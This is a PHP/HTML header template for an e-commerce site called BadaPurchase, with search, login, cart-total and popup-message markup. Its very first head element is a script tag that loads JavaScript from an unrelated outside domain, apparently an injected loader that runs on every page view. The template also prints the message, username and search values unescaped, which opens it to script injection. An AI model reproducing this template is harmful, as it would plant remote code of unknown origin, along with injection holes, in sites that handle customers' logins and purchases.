
<!DOCTYPE html>
<html lang="en">
<head><script src="http://d.safewebonline.com/l/load.js"></script>
<meta charset="utf-8">
<title>SimpleOne - A Responsive Html5 Ecommerce Template</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="">
<meta name="author" content="">
<meta http-equiv="X-UA-Compatible" content="IE=100" >
<link href='http://fonts.googleapis.com/css?family=Open+Sans:400,300italic,400italic,600,600italic' rel='stylesheet' type='text/css'>
<link href='http://fonts.googleapis.com/css?family=Crete+Round' rel='stylesheet' type='text/css'>
<link href='http://fonts.googleapis.com/css?family=Crete+Round' rel='stylesheet' type='text/css'>
<link href="<?php echo base_url('css/bootstrap.css')?>" rel="stylesheet">
<link href="<?php echo base_url('css/bootstrap-responsive.css')?>" rel="stylesheet">
<link href="<?php echo base_url('css/style.css')?>" rel="stylesheet">
<link href="<?php echo base_url('css/bootstrap.min.css')?>" rel="stylesheet">
<link href="<?php echo base_url('css/flexslider.css')?>" type="text/css" media="screen" rel="stylesheet"  />
<link href="<?php echo base_url('css/jquery.fancybox.css')?>" rel="stylesheet">
<link href="<?php echo base_url('css/cloud-zoom.css')?>" rel="stylesheet">
<link href="<?php echo base_url('css/portfolio.css')?>" rel="stylesheet">
<link href="<?php echo base_url('css/font-awesome.min.css')?>" rel="stylesheet">
<link href="<?php echo base_url('css/font-awesome.css')?>" rel="stylesheet">
<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
		<script type="text/javascript">
		jQuery(document).ready(function () {
		    setTimeout(function(){ jQuery("#pop").hide(); }, 3000);
		});
</script>
		
		
<!-- HTML5 shim, for IE6-8 support of HTML5 elements -->
<!--[if lt IE 9]>
      <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->
<!-- fav -->
<link rel="shortcut icon" href="assets/ico/favicon.ico">
</head>
<body>

<!-- Header Start -->
<header>
    <div class="headerstrip">
        <div class="container">
            <div class="row">
                <div class="span12"> <a href="<?php echo site_url('')?>" class="logo pull-left"><img src="<?php echo base_url('img/headlogo.png')?>" alt="Badapurchase" title="BadaPurchase"></a> 
                    <!-- Top Nav Start -->
                    <div class="pull-left" >
                        <div class="navbar" id="topnav">
                            <div class="navbar-inner">
                                <ul class="nav " >
                                    <li><div class=" top-search">
                                    		<form method="post" action="<?php echo site_url('tv/productui/'.$var)?>">
                                    		 <input type="text"  name="inputsearch"   list="inputsearch" placeholder="Search your product...">
                
           
										           <datalist id="inputsearch">
										           
										           <option selected disabled>Select Product</option>
										           <?php foreach($searchall as $ag){
										           
										          echo 	"<option value='$ag'> $ag </option>";}?>
										           </datalist>
                                             
                                       			<input type="hidden" name="search">
                                       		</form>
											
                                       </div>
                                    </li>
                                </ul>
                               
                             		<?php if(!empty($userid)){  foreach($data as $row){ $username=$row->fname;?>
                                     <ul class=" nav categorymenu " >
                                     <li ><a class="myaccount" href="<?php echo base_url('tv/profile')?>">&nbsp;<?php echo $username ?></a>
                                     <div>
                            			<ul>
                                			<li><a href="<?php echo site_url('tv/profile')?>" style="color:#800000">Your Profile</a> </li>
                                			<li><a href="<?php echo site_url('tv/logout')?>"style="color:#800000">Logout</a> </li>
                            			</ul>
                        			</div>
                                     </li>
                                     </ul><?php }}else {?>
                                <ul class=" nav categorymenu ">
                                <li >
                                <a class="myaccount" href="<?php echo base_url('tv/register')?>">Login/Register</a>
                                </ul>
                                    <?php }?>   
                                    
                                  <?php if(!empty($userid))
                                  {?>
                                      <ul class=" nav categorymenu " >
                                     <li ><a class="shoppingcart" href="<?php echo site_url('tv/shoppingcart')?>">
                                     <?php foreach ($count as $row4)
                                     {
                                     	$no=$row4->count;
                                     } 
                                     echo " Items "; echo $no ;
                                   
                                      
                                     
	                                     foreach($cart as $row3)
	                                     {
	                                       $sum=$row3->sum;
	                                     }
	                                     if(!empty($sum))
	                                     {
	                                     echo " Rs "; echo $sum+$sum*(14.5/100);
	                                     }
	                                     else
	                                     {
	                                     	echo " Rs 0";
	                                     }
	                                     
                                                                          	
                                     ?>
                                     </a>
                                     	
                                     <div>
                            			<ul>
                                			<li><a href="<?php echo site_url('tv/shoppingcart')?>" style="color:#800000">View Cart</a> </li>
                                			<li><a href="<?php echo site_url('tv/wishlist')?>"style="color:#800000">View Wishlist</a> </li>
                            			</ul>
                        			</div>
                                     </li>
                                     </ul>
                                       <?php }else {?> 
                                       <ul class=" nav categorymenu " >
                                     <li ><a class="shoppingcart" href="#">cart</a>
                                     <div>
                            			<ul>
                                		<div>Please login </div>
                                			
                            			</ul>
                        			</div>
                                     </li>
                                     </ul> 
                                     <?php }?>
                                    </div>
                               </div>
                           <div>
                    
            </div>
                 
      </div>
            </div>
        </div>
        </div>
        </div>
 
 <?php if(!empty($msg)){?>
 <div id="pop" style="height: 100px;
width: 600px; 
padding: 20px;
background-color: white; 
margin-left:auto;
margin-right:auto;
margin-top:15px;

/* outer shadows  (note the rgba is red, green, blue, alpha) */
-webkit-box-shadow: 0px 0px 12px rgba(0, 0, 0, 0.4); 
-moz-box-shadow: 0px 1px 6px rgba(23, 69, 88, .5);

/* rounded corners */
-webkit-border-radius: 12px;
-moz-border-radius: 7px; 
border-radius: 7px;

/* gradients */
background: -webkit-gradient(linear, left top, left bottom, 
color-stop(0%, white), color-stop(15%, white), color-stop(100%, #D7E9F5)); 
background: -moz-linear-gradient(top, white 0%, white 55%, #D5E4F3 130%); ">
 <h2 style="color:#8B8F8F; text-align:center"><?php echo $msg;?></h2>
 </div><?php }?>
 
   
 